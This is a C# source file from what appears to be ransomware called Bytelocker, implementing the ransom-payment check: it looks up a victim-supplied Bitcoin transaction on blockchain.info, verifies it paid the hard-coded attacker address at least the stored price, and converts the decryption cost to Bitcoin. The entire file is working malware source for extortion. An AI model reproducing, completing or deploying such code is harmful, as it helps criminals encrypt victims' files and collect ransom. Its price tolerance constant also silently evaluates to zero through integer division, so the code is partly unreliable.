using Bytelocker.Settings;
using Bytelocker.src.Tools;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Net;

namespace Bytelocker.CryptoPayment
{
    class PaymentManager
    {
        // any transaction id should be verified in a server to prevent duplication of verification
        private String transaction_id;
        private String receiver_adr;
        private decimal amt_sent;

        private RegistryManager rm;

        public const decimal PRICE_UNCERTIY = 6 / 10000;

        public PaymentManager()
        {
            this.rm = new RegistryManager();
        }

        public void SelectTransactionID(String transaction_id)
        {
            this.transaction_id = transaction_id;
            this.GetPaymentDetails();
        }

        public bool VerifyPayment()
        {
            if (!(this.receiver_adr == Bytelocker.BITCOIN_ADDRESS))
            {
                
                return false;
            } else
            {
                if (decimal.Parse(B64Manager.Base64ToString(this.rm.ReadStringValue(RegistryManager.SETTINGS_KEY_NAME, "p"))) - PRICE_UNCERTIY > this.amt_sent)
                {
                    return false;
                }

                return true;
            }
        }

        private void GetPaymentDetails()
        {
            String web_data = ReadSiteData("https://blockchain.info/rawtx/" + this.transaction_id);

            if (web_data == "Transaction not found")
            {
                this.receiver_adr = "none";
            } else
            {
                List<String> address_list = new List<String>();
                List<float> bitcoin_received = new List<float>();

                foreach (JToken out_token in JObject.Parse(web_data).SelectToken("out"))
                {
                    address_list.Add(out_token.SelectToken("addr").ToString());
                    bitcoin_received.Add(float.Parse(out_token.SelectToken("value").ToString()));
                    this.amt_sent += decimal.Parse(out_token.SelectToken("value").ToString());
                }

                this.amt_sent /= 100000000;

                float bitcoin_amt = 0;

                for (int i = 0; i < bitcoin_received.Count; i++)
                {
                    if (bitcoin_received[i] > bitcoin_amt)
                    {
                        bitcoin_amt = bitcoin_received[i];
                        this.receiver_adr = address_list[i];
                    }
                } 
            }
        }

        public static String ReadSiteData(String site)
        {
            WebClient wc = new System.Net.WebClient();
            byte[] raw_site_data = wc.DownloadData(site);

            return System.Text.Encoding.UTF8.GetString(raw_site_data);
        }

        public static String GetBitcoinPrice()
        {
            return ReadSiteData("https://blockchain.info/tobtc?currency=USD&value=" + Bytelocker.COST_TO_DECRYPT);
        }

    }
}
